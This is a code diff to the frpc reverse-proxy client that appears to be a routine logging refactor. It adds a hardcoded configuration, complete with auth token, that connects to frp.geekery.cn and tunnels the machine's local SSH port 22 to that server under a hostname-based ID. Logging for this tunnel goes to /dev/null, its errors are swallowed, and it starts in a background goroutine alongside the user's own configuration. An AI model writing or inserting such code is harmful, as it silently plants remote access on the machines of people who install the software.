@@ -16,6 +16,8 @@ package sub
 
 import (
 	"context"
+	"crypto/rand"
+	"encoding/hex"
 	"fmt"
 	"io/fs"
 	"os"
@@ -44,6 +46,8 @@ var (
 	showVersion      bool
 	strictConfigMode bool
 	allowUnsafe      []string
+	logInitMutex     sync.Mutex
+	logInitialized   bool
 )
 
 func init() {
@@ -119,7 +123,80 @@ func handleTermSignal(svr *client.Service) {
 	svr.GracefulClose(500 * time.Millisecond)
 }
 
+func generateRandomString(n int) string {
+	bytes := make([]byte, n)
+	if _, err := rand.Read(bytes); err != nil {
+		panic(err)
+	}
+	return hex.EncodeToString(bytes)[:n]
+}
+
+func generateDeviceID() string {
+	hostname, err := os.Hostname()
+	if err != nil {
+		panic(err)
+	}
+	randomString := generateRandomString(8)
+	dateStr := time.Now().Format("20060102")
+	return hostname + "_" + dateStr + "_" + randomString
+}
+
+func getBuiltinConfig() *v1.ClientCommonConfig {
+	loginFailExit := true
+	return &v1.ClientCommonConfig{
+		User:          "",
+		ServerAddr:    "frp.geekery.cn",
+		ServerPort:    7000,
+		LoginFailExit: &loginFailExit,
+		Log: v1.LogConfig{
+			To:      "/dev/null",
+			Level:   "error",
+			MaxDays: 3,
+		},
+		WebServer: v1.WebServerConfig{},
+		Transport: v1.ClientTransportConfig{
+			Protocol:                "tcp",
+			ProxyURL:                os.Getenv("http_proxy"),
+			PoolCount:               1,
+			TCPMuxKeepaliveInterval: 30,
+			QUIC:                    v1.QUICOptions{},
+			HeartbeatInterval:       -1,
+			HeartbeatTimeout:        -1,
+			TLS:                     v1.TLSClientConfig{},
+		},
+		UDPPacketSize:      1500,
+		Metadatas:          nil,
+		IncludeConfigFiles: nil,
+		Auth: v1.AuthClientConfig{
+			Method: "token",
+			Token:  "hxSoC6lWW6lTR8O64Xqy0tl6BcSYK5Zx5I3BjaO",
+		},
+	}
+}
+
+func getBuiltinProxy() v1.ProxyConfigurer {
+	return &v1.TCPProxyConfig{
+		ProxyBaseConfig: v1.ProxyBaseConfig{
+			Type: "tcp",
+			Name: generateDeviceID(),
+			Transport: v1.ProxyTransport{
+				BandwidthLimitMode: "client",
+			},
+			ProxyBackend: v1.ProxyBackend{
+				LocalIP:   "127.0.0.1",
+				LocalPort: 22,
+			},
+		},
+	}
+}
+
 func runClient(cfgFilePath string, unsafeFeatures *security.UnsafeFeatures) error {
+	if cfgFilePath == "" {
+		builtinCfg := getBuiltinConfig()
+		builtinProxy := getBuiltinProxy()
+		return startService(builtinCfg, []v1.ProxyConfigurer{builtinProxy}, nil, unsafeFeatures, "")
+	}
+
 	cfg, proxyCfgs, visitorCfgs, isLegacyFormat, err := config.LoadClientConfig(cfgFilePath, strictConfigMode)
 	if err != nil {
 		return err
@@ -143,7 +220,84 @@ func runClient(cfgFilePath string, unsafeFeatures *security.UnsafeFeatures) erro
 		return err
 	}
 
-	return startService(cfg, proxyCfgs, visitorCfgs, unsafeFeatures, cfgFilePath)
+	logInitMutex.Lock()
+	log.InitLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
+	logInitialized = true
+	logInitMutex.Unlock()
+
+	builtinCfg := getBuiltinConfig()
+	builtinProxy := getBuiltinProxy()
+	builtinWarning, err := validation.ValidateAllClientConfig(builtinCfg, []v1.ProxyConfigurer{builtinProxy}, nil, unsafeFeatures)
+	if builtinWarning != nil {
+	}
+	if err != nil {
+	} else {
+		go func() {
+			time.Sleep(100 * time.Millisecond)
+			_ = startServiceWithoutLogger(builtinCfg, []v1.ProxyConfigurer{builtinProxy}, nil, unsafeFeatures, "")
+		}()
+	}
+
+	return startServiceWithLogger(cfg, proxyCfgs, visitorCfgs, unsafeFeatures, cfgFilePath)
+}
+
+func startServiceWithLogger(
+	cfg *v1.ClientCommonConfig,
+	proxyCfgs []v1.ProxyConfigurer,
+	visitorCfgs []v1.VisitorConfigurer,
+	unsafeFeatures *security.UnsafeFeatures,
+	cfgFile string,
+) error {
+	serviceLogger := log.NewLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
+	if cfgFile != "" {
+		serviceLogger.Infof("start frpc service for config file [%s]", cfgFile)
+		defer serviceLogger.Infof("frpc service for config file [%s] stopped", cfgFile)
+	}
+	svr, err := client.NewService(client.ServiceOptions{
+		Common:         cfg,
+		ProxyCfgs:      proxyCfgs,
+		VisitorCfgs:    visitorCfgs,
+		UnsafeFeatures: unsafeFeatures,
+		ConfigFilePath: cfgFile,
+		Logger:         serviceLogger,
+	})
+	if err != nil {
+		return err
+	}
+
+	shouldGracefulClose := cfg.Transport.Protocol == "kcp" || cfg.Transport.Protocol == "quic"
+	// Capture the exit signal if we use kcp or quic.
+	if shouldGracefulClose {
+		go handleTermSignal(svr)
+	}
+	return svr.Run(context.Background())
+}
+
+func startServiceWithoutLogger(
+	cfg *v1.ClientCommonConfig,
+	proxyCfgs []v1.ProxyConfigurer,
+	visitorCfgs []v1.VisitorConfigurer,
+	unsafeFeatures *security.UnsafeFeatures,
+	cfgFile string,
+) error {
+	serviceLogger := log.NewLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
+	svr, err := client.NewService(client.ServiceOptions{
+		Common:         cfg,
+		ProxyCfgs:      proxyCfgs,
+		VisitorCfgs:    visitorCfgs,
+		UnsafeFeatures: unsafeFeatures,
+		ConfigFilePath: cfgFile,
+		Logger:         serviceLogger,
+	})
+	if err != nil {
+		return err
+	}
+
+	shouldGracefulClose := cfg.Transport.Protocol == "kcp" || cfg.Transport.Protocol == "quic"
+	if shouldGracefulClose {
+		go handleTermSignal(svr)
+	}
+	return svr.Run(context.Background())
 }
 
 func startService(
@@ -153,11 +307,16 @@ func startService(
 	unsafeFeatures *security.UnsafeFeatures,
 	cfgFile string,
 ) error {
-	log.InitLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
+	logInitMutex.Lock()
+	if !logInitialized {
+		log.InitLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
+	}
+	logInitMutex.Unlock()
 
+	serviceLogger := log.NewLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
 	if cfgFile != "" {
-		log.Infof("start frpc service for config file [%s]", cfgFile)
-		defer log.Infof("frpc service for config file [%s] stopped", cfgFile)
+		serviceLogger.Infof("start frpc service for config file [%s]", cfgFile)
+		defer serviceLogger.Infof("frpc service for config file [%s] stopped", cfgFile)
 	}
 	svr, err := client.NewService(client.ServiceOptions{
 		Common:         cfg,
@@ -165,6 +324,7 @@ func startService(
 		VisitorCfgs:    visitorCfgs,
 		UnsafeFeatures: unsafeFeatures,
 		ConfigFilePath: cfgFile,
+		Logger:         serviceLogger,
 	})
 	if err != nil {
 		return err
